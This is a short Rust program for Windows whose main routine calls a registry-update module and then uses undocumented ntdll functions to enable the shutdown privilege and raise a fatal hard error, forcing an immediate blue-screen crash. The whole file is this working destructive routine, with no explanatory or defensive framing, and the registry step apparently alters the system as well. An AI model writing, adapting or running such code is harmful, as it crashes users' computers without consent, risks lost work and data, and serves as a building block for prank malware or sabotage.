use std::{ffi::{c_ulong, c_ulonglong}, mem::transmute};
use windows::{Win32::{Foundation::{NTSTATUS, STATUS_FLOAT_MULTIPLE_FAULTS}, System::LibraryLoader::{GetProcAddress, LoadLibraryA}}, core::PCSTR};
use crate::registry;
type RtlAdjustPrivilige= unsafe extern "C" fn(privilge: c_ulong, enable: bool, currentThread: bool, enabled: *mut bool) -> NTSTATUS;
type NtRaiseHardError= unsafe extern "C" fn(errorStatus: NTSTATUS, numberOfParams: c_ulong, unicodeStrParamMask : c_ulong, params: *const c_ulonglong, responseOption: c_ulong, response: *mut c_ulong) -> i64;
pub async fn main() {
    registry::update_registry().await;
    unsafe {
        let hndl= LoadLibraryA(PCSTR("ntdll.dll\0".as_ptr())).expect("ntdll to exist");
        let adjust_priv: RtlAdjustPrivilige= transmute(GetProcAddress(hndl,
            PCSTR("RtlAdjustPrivilege\0".as_ptr())).expect("RtlAdjustPrivilige to exist"));
        let raise_hard_err: NtRaiseHardError= transmute(GetProcAddress(hndl,
            PCSTR("NtRaiseHardError\0".as_ptr())).expect("NtRaiseHardError to exist"));
        let mut output: c_ulong= 0;
        let mut enabled= false;
        adjust_priv(19, true, false, &mut enabled);
        raise_hard_err(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, std::mem::zeroed(), 6, &mut output);
    }
}